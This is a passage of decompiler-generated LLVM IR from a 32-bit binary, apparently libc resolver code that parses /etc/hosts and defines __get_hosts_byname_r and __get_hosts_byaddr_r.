  br i1 %v3_80651745, label %dec_label_pc_8065180, label %dec_label_pc_8065179

dec_label_pc_806512a:                             ; preds = %dec_label_pc_8065179
  store i32 %stack_var_-196.011, i32* @eax, align 4
  %v1_806512e = load i32, i32* @esp, align 4
  %v3_806512e = mul nuw nsw i32 %stack_var_-196.011, 4
  %v4_806512e = add nuw nsw i32 %v3_806512e, 152
  %v5_806512e = add i32 %v4_806512e, %v1_806512e
  %v6_806512e = inttoptr i32 %v5_806512e to i32*
  store i32 %v0_806512e, i32* %v6_806512e, align 4
  %v0_8065138.pre = load i32, i32* @ebx, align 4
  %v4_8065138.pre = load i32, i32* @ecx, align 4
  %v1_806513859 = inttoptr i32 %v0_8065138.pre to i8*
  %v2_806513860 = load i8, i8* %v1_806513859, align 1
  %v3_806513861 = zext i8 %v2_806513860 to i32
  %v5_806513862 = and i32 %v4_8065138.pre, -256
  %v6_806513863 = or i32 %v3_806513861, %v5_806513862
  %v4_806513a64 = icmp eq i8 %v2_806513860, 0
  br i1 %v4_806513a64, label %dec_label_pc_8065157.preheader, label %dec_label_pc_806513e.lr.ph

dec_label_pc_806513e.lr.ph:                       ; preds = %dec_label_pc_806512a
  %v0_8065141.pre = load i32, i32* @global_var_8074860, align 32
  br label %dec_label_pc_806513e

dec_label_pc_8065137:                             ; preds = %dec_label_pc_806514c
  %v1_8065137 = add i32 %v0_806513765, 1
  store i32 %v1_8065137, i32* @ebx, align 4
  %v1_8065138 = inttoptr i32 %v1_8065137 to i8*
  %v2_8065138 = load i8, i8* %v1_8065138, align 1
  %v3_8065138 = zext i8 %v2_8065138 to i32
  %v5_8065138 = and i32 %v6_806513867, -256
  %v6_8065138 = or i32 %v3_8065138, %v5_8065138
  %v4_806513a = icmp eq i8 %v2_8065138, 0
  br i1 %v4_806513a, label %dec_label_pc_8065157.preheader, label %dec_label_pc_806513e

dec_label_pc_806513e:                             ; preds = %dec_label_pc_806513e.lr.ph, %dec_label_pc_8065137
  %v6_806513867 = phi i32 [ %v6_806513863, %dec_label_pc_806513e.lr.ph ], [ %v6_8065138, %dec_label_pc_8065137 ]
  %v2_806513866 = phi i8 [ %v2_806513860, %dec_label_pc_806513e.lr.ph ], [ %v2_8065138, %dec_label_pc_8065137 ]
  %v0_806513765 = phi i32 [ %v0_8065138.pre, %dec_label_pc_806513e.lr.ph ], [ %v1_8065137, %dec_label_pc_8065137 ]
  %v2_806513e = sext i8 %v2_806513866 to i32
  store i32 %v2_806513e, i32* @edx, align 4
  store i32 %v0_8065141.pre, i32* @eax, align 4
  %v2_8065146 = mul nsw i32 %v2_806513e, 2
  %v3_8065146 = add i32 %v0_8065141.pre, %v2_8065146
  %v4_8065146 = inttoptr i32 %v3_8065146 to i8*
  %v5_8065146 = load i8, i8* %v4_8065146, align 1
  %v6_8065146 = and i8 %v5_8065146, 32
  %v7_8065146 = icmp eq i8 %v6_8065146, 0
  %v1_806514a = icmp eq i1 %v7_8065146, false
  br i1 %v1_806514a, label %dec_label_pc_8065157.preheader, label %dec_label_pc_806514c

dec_label_pc_806514c:                             ; preds = %dec_label_pc_806513e
  %v10_806514c = icmp eq i8 %v2_806513866, 10
  %v1_806514f = icmp eq i1 %v10_806514c, false
  br i1 %v1_806514f, label %dec_label_pc_8065137, label %dec_label_pc_8065157.preheader

dec_label_pc_8065157.preheader:                   ; preds = %dec_label_pc_806514c, %dec_label_pc_806513e, %dec_label_pc_8065137, %dec_label_pc_806512a
  %v0_8065137.lcssa = phi i32 [ %v0_8065138.pre, %dec_label_pc_806512a ], [ %v1_8065137, %dec_label_pc_8065137 ], [ %v0_806513765, %dec_label_pc_806513e ], [ %v0_806513765, %dec_label_pc_806514c ]
  %v6_8065138.lcssa = phi i32 [ %v6_806513863, %dec_label_pc_806512a ], [ %v6_8065138, %dec_label_pc_8065137 ], [ %v6_806513867, %dec_label_pc_806513e ], [ %v6_806513867, %dec_label_pc_806514c ]
  %v1_806515773 = inttoptr i32 %v0_8065137.lcssa to i8*
  %v2_806515774 = load i8, i8* %v1_806515773, align 1
  %v3_806515775 = zext i8 %v2_806515774 to i32
  %v5_806515776 = and i32 %v6_8065138.lcssa, -256
  %v6_806515777 = or i32 %v3_806515775, %v5_806515776
  store i32 %v6_806515777, i32* @ecx, align 4
  %v4_806515978 = icmp eq i8 %v2_806515774, 0
  br i1 %v4_806515978, label %dec_label_pc_8065170, label %dec_label_pc_806515d

dec_label_pc_8065153:                             ; preds = %dec_label_pc_806516b, %dec_label_pc_806515d
  store i8 0, i8* %v1_806515780, align 1
  %v0_8065156 = load i32, i32* @ebx, align 4
  %v1_8065156 = add i32 %v0_8065156, 1
  store i32 %v1_8065156, i32* @ebx, align 4
  %v4_8065157.pre = load i32, i32* @ecx, align 4
  %v1_8065157 = inttoptr i32 %v1_8065156 to i8*
  %v2_8065157 = load i8, i8* %v1_8065157, align 1
  %v3_8065157 = zext i8 %v2_8065157 to i32
  %v5_8065157 = and i32 %v4_8065157.pre, -256
  %v6_8065157 = or i32 %v3_8065157, %v5_8065157
  store i32 %v6_8065157, i32* @ecx, align 4
  %v4_8065159 = icmp eq i8 %v2_8065157, 0
  br i1 %v4_8065159, label %dec_label_pc_8065170, label %dec_label_pc_806515d

dec_label_pc_806515d:                             ; preds = %dec_label_pc_8065157.preheader, %dec_label_pc_8065153
  %v2_806515781 = phi i8 [ %v2_8065157, %dec_label_pc_8065153 ], [ %v2_806515774, %dec_label_pc_8065157.preheader ]
  %v1_806515780 = phi i8* [ %v1_8065157, %dec_label_pc_8065153 ], [ %v1_806515773, %dec_label_pc_8065157.preheader ]
  %v0_806517479 = phi i32 [ %v1_8065156, %dec_label_pc_8065153 ], [ %v0_8065137.lcssa, %dec_label_pc_8065157.preheader ]
  %v2_806515d = sext i8 %v2_806515781 to i32
  store i32 %v2_806515d, i32* @edx, align 4
  %v0_8065160 = load i32, i32* @global_var_8074860, align 32
  store i32 %v0_8065160, i32* @eax, align 4
  %v2_8065165 = mul nsw i32 %v2_806515d, 2
  %v3_8065165 = add i32 %v0_8065160, %v2_8065165
  %v4_8065165 = inttoptr i32 %v3_8065165 to i8*
  %v5_8065165 = load i8, i8* %v4_8065165, align 1
  %v6_8065165 = and i8 %v5_8065165, 32
  %v7_8065165 = icmp eq i8 %v6_8065165, 0
  %v1_8065169 = icmp eq i1 %v7_8065165, false
  br i1 %v1_8065169, label %dec_label_pc_8065153, label %dec_label_pc_806516b

dec_label_pc_806516b:                             ; preds = %dec_label_pc_806515d
  %v10_806516b = icmp eq i8 %v2_806515781, 10
  br i1 %v10_806516b, label %dec_label_pc_8065153, label %dec_label_pc_8065170

dec_label_pc_8065170:                             ; preds = %dec_label_pc_8065153, %dec_label_pc_806516b, %dec_label_pc_8065157.preheader
  %v0_8065174.lcssa = phi i32 [ %v0_8065137.lcssa, %dec_label_pc_8065157.preheader ], [ %v0_806517479, %dec_label_pc_806516b ], [ %v1_8065156, %dec_label_pc_8065153 ]
  %v1_8065157.lcssa = phi i8* [ %v1_806515773, %dec_label_pc_8065157.preheader ], [ %v1_806515780, %dec_label_pc_806516b ], [ %v1_8065157, %dec_label_pc_8065153 ]
  %v4_8065170 = add nuw nsw i32 %stack_var_-196.011, 1
  %v2_8065174 = load i8, i8* %v1_8065157.lcssa, align 1
  %v3_8065174 = icmp eq i8 %v2_8065174, 0
  br i1 %v3_8065174, label %dec_label_pc_8065180, label %dec_label_pc_8065179

dec_label_pc_8065179:                             ; preds = %dec_label_pc_8065174.preheader, %dec_label_pc_8065170
  %v0_806512e = phi i32 [ %v0_8065174.lcssa, %dec_label_pc_8065170 ], [ %v0_80650f655, %dec_label_pc_8065174.preheader ]
  %stack_var_-196.011 = phi i32 [ %v4_8065170, %dec_label_pc_8065170 ], [ 0, %dec_label_pc_8065174.preheader ]
  %v7_806517e = icmp sgt i32 %stack_var_-196.011, 4
  br i1 %v7_806517e, label %dec_label_pc_8065180, label %dec_label_pc_806512a

dec_label_pc_8065180:                             ; preds = %dec_label_pc_8065170, %dec_label_pc_8065179, %dec_label_pc_8065174.preheader
  %stack_var_-196.0.lcssa = phi i32 [ 0, %dec_label_pc_8065174.preheader ], [ %v4_8065170, %dec_label_pc_8065170 ], [ %stack_var_-196.011, %dec_label_pc_8065179 ]
  store i32 %tmp, i32* @edi, align 4
  %v0_8065187 = load i32, i32* @esi, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_806e2e8.829 to i32), i32* %stack_var_-216, align 4
  %v4_806518f = call i32 @__GI_strcoll(i8* %v3_806518f, i32 ptrtoint ([11 x i8]* @global_var_806e2e8.829 to i32), i32 %v0_8065187)
  store i32 %v4_806518f, i32* @eax, align 4
  store i32 1, i32* @esi, align 4
  %v1_806519c = icmp eq i32 %v4_806518f, 0
  br i1 %v1_806519c, label %dec_label_pc_80651c4.preheader, label %dec_label_pc_80651d5

dec_label_pc_80651c4.preheader:                   ; preds = %dec_label_pc_8065180
  %v5_80651c893 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_80651c893, label %dec_label_pc_80651ca.lr.ph, label %dec_label_pc_80651d5

dec_label_pc_80651ca.lr.ph:                       ; preds = %dec_label_pc_80651c4.preheader
  %v0_80651ca.pre = load i32, i32* @global_var_807ea60.726, align 32
  br label %dec_label_pc_80651ca

dec_label_pc_80651a2:                             ; preds = %dec_label_pc_80651ca
  %v2_80651a5 = mul i32 %v1_80651a594, 4
  %v4_80651a5 = add i32 %v2_80651a5, %v3_80651a5
  %v5_80651a5 = inttoptr i32 %v4_80651a5 to i32*
  %v6_80651a5 = load i32, i32* %v5_80651a5, align 4
  %v1_80651ac = inttoptr i32 %v6_80651a5 to i8*
  %v2_80651ac = call i32 @__GI_strdup(i8* %v1_80651ac)
  %v0_80651b1 = load i32, i32* @esi, align 4
  %v1_80651b1 = add i32 %v0_80651b1, 1
  store i32 %v1_80651b1, i32* @esi, align 4
  %v1_80651b2 = load i32, i32* @ebx, align 4
  %v2_80651b2 = mul i32 %v1_80651b2, 4
  %v3_80651b2 = add i32 %v2_80651b2, 134736468
  %v4_80651b2 = inttoptr i32 %v3_80651b2 to i32*
  store i32 %v2_80651ac, i32* %v4_80651b2, align 4
  %v0_80651b9 = load i32, i32* @ebx, align 4
  %v1_80651b9 = add i32 %v0_80651b9, 1
  store i32 %v1_80651b9, i32* @eax, align 4
  store i32 %v1_80651b9, i32* @global_var_807ea60.726, align 32
  %v0_80651c4.pre = load i32, i32* @esi, align 4
  %v5_80651c8 = icmp slt i32 %v0_80651c4.pre, %stack_var_-196.0.lcssa
  br i1 %v5_80651c8, label %dec_label_pc_80651ca, label %dec_label_pc_80651d5

dec_label_pc_80651ca:                             ; preds = %dec_label_pc_80651ca.lr.ph, %dec_label_pc_80651a2
  %v0_80651ca = phi i32 [ %v0_80651ca.pre, %dec_label_pc_80651ca.lr.ph ], [ %v1_80651b9, %dec_label_pc_80651a2 ]
  %v1_80651a594 = phi i32 [ 1, %dec_label_pc_80651ca.lr.ph ], [ %v0_80651c4.pre, %dec_label_pc_80651a2 ]
  store i32 %v0_80651ca, i32* @ebx, align 4
  %v7_80651d3 = icmp sgt i32 %v0_80651ca, 2
  br i1 %v7_80651d3, label %dec_label_pc_80651d5, label %dec_label_pc_80651a2

dec_label_pc_80651d5:                             ; preds = %dec_label_pc_80651c4.preheader, %dec_label_pc_80651a2, %dec_label_pc_80651ca, %dec_label_pc_8065180
  %v0_80651d5 = load i32, i32* @ebx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_806e2f3.830 to i32), i32* %stack_var_-216, align 4
  %v0_80651dc = load i32, i32* @edi, align 4
  %v3_80651dd = inttoptr i32 %v0_80651dc to i8*
  %v4_80651dd = call i32 @__GI_strcoll(i8* %v3_80651dd, i32 ptrtoint ([7 x i8]* @global_var_806e2f3.830 to i32), i32 %v0_80651d5)
  store i32 %v4_80651dd, i32* @eax, align 4
  %v1_80651e5 = icmp eq i32 %v4_80651dd, 0
  br i1 %v1_80651e5, label %dec_label_pc_8065227.preheader, label %dec_label_pc_80651e9

dec_label_pc_80651e9:                             ; preds = %dec_label_pc_80651d5
  %v0_80651e9 = load i32, i32* @ecx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_806e2fa.831 to i32), i32* %stack_var_-216, align 4
  %v0_80651f0 = load i32, i32* @edi, align 4
  %v3_80651f1 = inttoptr i32 %v0_80651f0 to i8*
  %v4_80651f1 = call i32 @__GI_strcoll(i8* %v3_80651f1, i32 ptrtoint ([7 x i8]* @global_var_806e2fa.831 to i32), i32 %v0_80651e9)
  %v1_80651f9 = icmp eq i32 %v4_80651f1, 0
  br i1 %v1_80651f9, label %dec_label_pc_8065227.preheader, label %dec_label_pc_806526a

dec_label_pc_8065227.preheader:                   ; preds = %dec_label_pc_80651d5, %dec_label_pc_80651e9
  %v0_806522795 = load i32, i32* @global_var_807ea64.825, align 4
  %tmp4397 = icmp slt i32 %v0_806522795, 1
  %tmp4498 = icmp eq i1 %tmp4397, false
  br i1 %tmp4498, label %dec_label_pc_80651ff, label %dec_label_pc_8065230

dec_label_pc_80651ff:                             ; preds = %dec_label_pc_8065227.preheader, %dec_label_pc_80651ff.dec_label_pc_80651ff_crit_edge
  %v0_806522799 = phi i32 [ %v0_8065227, %dec_label_pc_80651ff.dec_label_pc_80651ff_crit_edge ], [ %v0_806522795, %dec_label_pc_8065227.preheader ]
  %v1_80651ff = add i32 %v0_806522799, -1
  store i32 %v1_80651ff, i32* @global_var_807ea64.825, align 4
  %v1_8065208 = mul i32 %v1_80651ff, 4
  %v2_8065208 = add i32 %v1_8065208, 134736452
  %v3_8065208 = inttoptr i32 %v2_8065208 to i32*
  %v4_8065208 = load i32, i32* %v3_8065208, align 4
  %v1_806520f = call i32 @free(i32 %v4_8065208)
  %v0_8065214 = load i32, i32* @global_var_807ea64.825, align 4
  %v1_806521c = mul i32 %v0_8065214, 4
  %v2_806521c = add i32 %v1_806521c, ptrtoint (i32* @global_var_807ea44.832 to i32)
  %v3_806521c = inttoptr i32 %v2_806521c to i32*
  store i32 0, i32* %v3_806521c, align 4
  %v0_8065227 = load i32, i32* @global_var_807ea64.825, align 4
  %tmp43 = icmp slt i32 %v0_8065227, 1
  %tmp44 = icmp eq i1 %tmp43, false
  br i1 %tmp44, label %dec_label_pc_80651ff.dec_label_pc_80651ff_crit_edge, label %dec_label_pc_8065230

dec_label_pc_80651ff.dec_label_pc_80651ff_crit_edge: ; preds = %dec_label_pc_80651ff
  br label %dec_label_pc_80651ff

dec_label_pc_8065230:                             ; preds = %dec_label_pc_80651ff, %dec_label_pc_8065227.preheader
  %v0_8065227.lcssa = phi i32 [ %v0_806522795, %dec_label_pc_8065227.preheader ], [ %v0_8065227, %dec_label_pc_80651ff ]
  store i32 1, i32* @esi, align 4
  %v5_806525d108 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_806525d108, label %dec_label_pc_806525f, label %dec_label_pc_806526a

dec_label_pc_8065237:                             ; preds = %dec_label_pc_806525f
  %v2_806523a = mul i32 %v1_806523a110, 4
  %v4_806523a = add i32 %v2_806523a, %v3_80651a5
  %v5_806523a = inttoptr i32 %v4_806523a to i32*
  %v6_806523a = load i32, i32* %v5_806523a, align 4
  %v1_8065241 = inttoptr i32 %v6_806523a to i8*
  %v2_8065241 = call i32 @__GI_strdup(i8* %v1_8065241)
  %v0_8065246 = load i32, i32* @esi, align 4
  %v1_8065246 = add i32 %v0_8065246, 1
  store i32 %v1_8065246, i32* @esi, align 4
  %v1_8065247 = load i32, i32* @ebx, align 4
  %v2_8065247 = mul i32 %v1_8065247, 4
  %v3_8065247 = add i32 %v2_8065247, 134736452
  %v4_8065247 = inttoptr i32 %v3_8065247 to i32*
  store i32 %v2_8065241, i32* %v4_8065247, align 4
  %v0_806524e = load i32, i32* @ebx, align 4
  %v1_806524e = add i32 %v0_806524e, 1
  store i32 %v1_806524e, i32* @global_var_807ea64.825, align 4
  %v0_8065259.pre = load i32, i32* @esi, align 4
  %v5_806525d = icmp slt i32 %v0_8065259.pre, %stack_var_-196.0.lcssa
  br i1 %v5_806525d, label %dec_label_pc_806525f, label %dec_label_pc_806526a

dec_label_pc_806525f:                             ; preds = %dec_label_pc_8065230, %dec_label_pc_8065237
  %v1_806523a110 = phi i32 [ %v0_8065259.pre, %dec_label_pc_8065237 ], [ 1, %dec_label_pc_8065230 ]
  %v0_806525f109 = phi i32 [ %v1_806524e, %dec_label_pc_8065237 ], [ %v0_8065227.lcssa, %dec_label_pc_8065230 ]
  store i32 %v0_806525f109, i32* @ebx, align 4
  %v7_8065268 = icmp sgt i32 %v0_806525f109, 3
  br i1 %v7_8065268, label %dec_label_pc_806526a, label %dec_label_pc_8065237

dec_label_pc_806526a:                             ; preds = %dec_label_pc_80650f7.preheader, %dec_label_pc_80650f6, %dec_label_pc_8065230, %dec_label_pc_806525f, %dec_label_pc_8065237, %dec_label_pc_80651e9, %dec_label_pc_8065118, %dec_label_pc_806510f, %dec_label_pc_806526a.preheader
  %v0_806526a = load i32, i32* @edx, align 4
  store i32 128, i32* %stack_var_-216, align 4
  store i32 %v2_8065271, i32* @ebx, align 4
  %v3_8065276 = call i32 @fgets(i32 %v2_8065271, i32 128, i32 %v0_806526a)
  %v1_806527e = icmp eq i32 %v3_8065276, 0
  %v1_8065280 = icmp eq i1 %v1_806527e, false
  br i1 %v1_8065280, label %dec_label_pc_80650f7.preheader, label %dec_label_pc_8065286

dec_label_pc_80650f7.preheader:                   ; preds = %dec_label_pc_806526a
  %v0_80650f7.pre = load i32, i32* @ebx, align 4
  %v4_80650f7.pre = load i32, i32* @ecx, align 4
  %v1_80650f749 = inttoptr i32 %v0_80650f7.pre to i8*
  %v2_80650f750 = load i8, i8* %v1_80650f749, align 1
  %v3_80650f751 = zext i8 %v2_80650f750 to i32
  %v5_80650f752 = and i32 %v4_80650f7.pre, -256
  %v6_80650f753 = or i32 %v3_80650f751, %v5_80650f752
  store i32 %v6_80650f753, i32* @ecx, align 4
  %v4_80650f954 = icmp eq i8 %v2_80650f750, 0
  br i1 %v4_80650f954, label %dec_label_pc_806526a, label %dec_label_pc_8065101.lr.ph

dec_label_pc_8065101.lr.ph:                       ; preds = %dec_label_pc_80650f7.preheader
  %v0_8065104.pre = load i32, i32* @global_var_8074860, align 32
  br label %dec_label_pc_8065101

dec_label_pc_8065286:                             ; preds = %dec_label_pc_806526a
  %v0_8065289 = load i32, i32* @ebp, align 4
  %v1_806528a = inttoptr i32 %v0_8065289 to i16*
  %v2_806528a = call i32 @__GI_fclose(i16* %v1_806528a)
  br label %dec_label_pc_806529f

dec_label_pc_8065294:                             ; preds = %dec_label_pc_80650d3
  %v0_8065294 = call i32 @__GI___h_errno_location()
  %v1_8065299 = inttoptr i32 %v0_8065294 to i32*
  store i32 3, i32* %v1_8065299, align 4
  br label %dec_label_pc_806529f

dec_label_pc_806529f:                             ; preds = %entry, %dec_label_pc_8065286, %dec_label_pc_8065294
  store i32 1, i32* %stack_var_-216, align 4
  %v3_80652ab = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  %v2_80652b6 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80652b6, i32* @ebx, align 4
  store i32 %v0_806507a, i32* @esi, align 4
  store i32 %v0_8065079, i32* @edi, align 4
  store i32 %v0_8065078, i32* @ebp, align 4
  ret i32 %v3_80652ab

; uselistorder directives
  uselistorder i32 %v0_8065104.pre, { 1, 0 }
  uselistorder i32 %v6_80650f753, { 1, 0 }
  uselistorder i8 %v2_80650f750, { 1, 2, 0 }
  uselistorder i8* %v1_80650f749, { 1, 0 }
  uselistorder i32 %v0_80650f7.pre, { 1, 0 }
  uselistorder i32 %v0_8065227, { 0, 2, 1 }
  uselistorder i32 %v1_80651ff, { 1, 0 }
  uselistorder i32 %v0_80651ca, { 1, 0 }
  uselistorder i32 %v0_80651c4.pre, { 1, 0 }
  uselistorder i32 %stack_var_-196.0.lcssa, { 3, 1, 2, 0 }
  uselistorder i32 %stack_var_-196.011, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_806515d, { 1, 0 }
  uselistorder i8 %v2_806515781, { 1, 0 }
  uselistorder i32 %v2_806513e, { 1, 0 }
  uselistorder i8 %v2_806513866, { 1, 0 }
  uselistorder i32 %v1_8065137, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8065101, { 1, 0 }
  uselistorder i32 %v1_80650f6, { 1, 0, 2 }
  uselistorder i32 %v2_80650df, { 1, 0 }
  uselistorder i32 %v2_80650c1, { 1, 0, 2 }
  uselistorder i32* %stack_var_-216, { 0, 1, 2, 3, 4, 5, 6, 8, 7 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 ()* @__GI___h_errno_location, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 128, { 21, 47, 6, 7, 26, 52, 54, 48, 4, 8, 9, 10, 11, 55, 0, 56, 57, 5, 1, 12, 53, 13, 14, 15, 49, 2, 3, 50, 51, 27, 22, 29, 28, 16, 42, 30, 23, 32, 31, 17, 43, 33, 24, 35, 34, 18, 44, 36, 38, 37, 19, 45, 39, 25, 41, 40, 20, 46 }
  uselistorder i32* @global_var_807ea64.825, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32* @esp, { 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 30, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 26, 497, 498, 499, 27, 500, 24, 501, 502, 503, 504, 505, 506, 28, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 25, 520, 521, 522, 523, 524, 525, 29, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 205, 6, 206, 207, 5, 4, 208, 209, 210, 31, 211, 212, 213, 33, 7, 214, 215, 216, 217, 218, 219, 220, 221, 222, 34, 32, 163, 164, 165, 166, 167, 35, 36, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 223, 560, 8, 9, 460, 10, 11, 12, 13, 14, 224, 225, 226, 227, 228, 229, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 37, 197, 198, 199, 38, 200, 201, 39, 202, 203, 204, 40, 561, 562, 563, 564, 41, 565, 566, 567, 568, 569, 43, 570, 571, 572, 45, 573, 46, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 44, 586, 47, 587, 588, 589, 48, 590, 591, 592, 593, 594, 595, 596, 597, 42, 598, 601, 604, 602, 599, 230, 231, 232, 233, 234, 603, 600, 605, 235, 236, 71, 237, 69, 70, 72, 73, 74, 75, 76, 77, 78, 79, 50, 49, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 104, 51, 97, 98, 99, 100, 101, 102, 52, 103, 21, 105, 106, 107, 108, 109, 238, 239, 68, 606, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 15, 254, 255, 256, 257, 258, 259, 265, 22, 260, 55, 261, 262, 54, 263, 264, 266, 267, 268, 269, 0, 270, 271, 272, 273, 53, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 1, 285, 286, 56, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 57, 58, 59, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 16, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 60, 155, 156, 157, 158, 159, 160, 161, 162, 320, 17, 321, 332, 18, 322, 323, 324, 325, 326, 61, 327, 328, 329, 330, 331, 333, 334, 347, 19, 335, 336, 337, 338, 339, 340, 341, 62, 342, 343, 344, 345, 346, 348, 349, 350, 351, 352, 353, 2, 354, 63, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 23, 386, 387, 388, 389, 390, 391, 64, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 65, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 446, 445, 447, 448, 449, 451, 450, 452, 453, 454, 456, 455, 457, 458, 459, 461, 462, 463, 464, 465, 466, 467, 20, 468, 469, 470, 471, 472, 473, 474, 475, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 66, 557, 3, 558, 559, 67 }
  uselistorder i32 164, { 4, 0, 1, 2, 5, 3 }
  uselistorder i32* @global_var_807ea60.726, { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_80748a0.725 to i32), { 4, 0, 8, 9, 10, 11, 12, 13, 5, 14, 1, 6, 15, 2, 7, 16, 3 }
  uselistorder label %dec_label_pc_806529f, { 2, 1, 0 }
  uselistorder label %dec_label_pc_806526a, { 0, 3, 4, 2, 5, 6, 7, 1, 8 }
  uselistorder label %dec_label_pc_806525f, { 1, 0 }
  uselistorder label %dec_label_pc_80651ff, { 1, 0 }
  uselistorder label %dec_label_pc_8065227.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_80651d5, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_80651ca, { 1, 0 }
  uselistorder label %dec_label_pc_8065180, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8065179, { 1, 0 }
  uselistorder label %dec_label_pc_8065170, { 1, 0, 2 }
  uselistorder label %dec_label_pc_806515d, { 1, 0 }
  uselistorder label %dec_label_pc_806513e, { 1, 0 }
  uselistorder label %dec_label_pc_806526a.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v9_80652df = inttoptr i32 %arg3 to i32*
  %v10_80652df = call i32 @__read_etc_hosts_r(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_80652df, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7)
  ret i32 %v10_80652df
}

define i32 @__get_hosts_byaddr_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-54 = alloca i32, align 4
  %v0_80652e8 = load i32, i32* @esi, align 4
  %v0_80652e9 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v9_80652f5 = icmp eq i32 %arg3, 2
  br i1 %v9_80652f5, label %dec_label_pc_8065301, label %dec_label_pc_80652fa

dec_label_pc_80652fa:                             ; preds = %entry
  %v9_80652fa = icmp eq i32 %arg3, 10
  %v1_80652fd = icmp eq i1 %v9_80652fa, false
  br i1 %v1_80652fd, label %dec_label_pc_8065341, label %dec_label_pc_8065306

dec_label_pc_8065301:                             ; preds = %entry
  %v1_8065301 = add i32 %arg2, -4
  br label %dec_label_pc_8065309

dec_label_pc_8065306:                             ; preds = %dec_label_pc_80652fa
  %v1_8065306 = add i32 %arg2, -16
  br label %dec_label_pc_8065309

dec_label_pc_8065309:                             ; preds = %dec_label_pc_8065301, %dec_label_pc_8065306
  %storemerge2.in = phi i32 [ %v1_8065301, %dec_label_pc_8065301 ], [ %v1_8065306, %dec_label_pc_8065306 ]
  %storemerge2 = icmp eq i32 %storemerge2.in, 0
  %v1_8065309 = icmp eq i1 %storemerge2, false
  br i1 %v1_8065309, label %dec_label_pc_8065341, label %dec_label_pc_806530b

dec_label_pc_806530b:                             ; preds = %dec_label_pc_8065309
  %v2_806530d = ptrtoint i32* %stack_var_-54 to i32
  store i32 %v2_806530d, i32* @ebx, align 4
  %v4_8065317 = bitcast i32* %stack_var_-54 to i8*
  %v5_8065317 = call i32 @__GI_inet_ntop(i32 %arg3, i32 %arg1, i8* %v4_8065317, i32 46)
  %v0_8065333 = load i32, i32* @esi, align 4
  %v9_8065337 = inttoptr i32 %arg4 to i32*
  %v10_8065337 = call i32 @__read_etc_hosts_r(i32 0, i32 %v2_806530d, i32 %v0_8065333, i32 2, i32* %v9_8065337, i32 %arg5, i32 %arg6, i32 %arg7, i32 %tmp12)
  br label %dec_label_pc_8065343

dec_label_pc_8065341:                             ; preds = %dec_label_pc_8065309, %dec_label_pc_80652fa
  br label %dec_label_pc_8065343

dec_label_pc_8065343:                             ; preds = %dec_label_pc_806530b, %dec_label_pc_8065341
  %v0_8065348 = phi i32 [ %v10_8065337, %dec_label_pc_806530b ], [ 0, %dec_label_pc_8065341 ]
  store i32 %v0_80652e9, i32* @ebx, align 4
  store i32 %v0_80652e8, i32* @esi, align 4
  ret i32 %v0_8065348

; uselistorder directives
  uselistorder i32 (i32, i32, i8*, i32)* @__GI_inet_ntop, { 1, 0 }
